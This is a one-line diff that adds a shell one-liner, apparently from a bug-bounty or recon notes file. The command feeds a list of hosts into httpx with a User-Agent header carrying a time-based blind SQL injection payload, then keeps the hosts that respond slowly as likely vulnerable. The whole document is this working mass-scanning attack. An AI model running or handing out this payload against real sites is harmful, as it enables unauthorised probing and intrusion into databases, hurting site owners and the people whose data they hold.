@@ -1,0 +1,1 @@
+cat httpx.txt|httpx -H 'User-Agent: "XOR(if(now()=sysdate(),sleep(5),0))XOR"' -t 60 -rt -frt '< 4' -timeout 170|anew timebase-sqli.txt
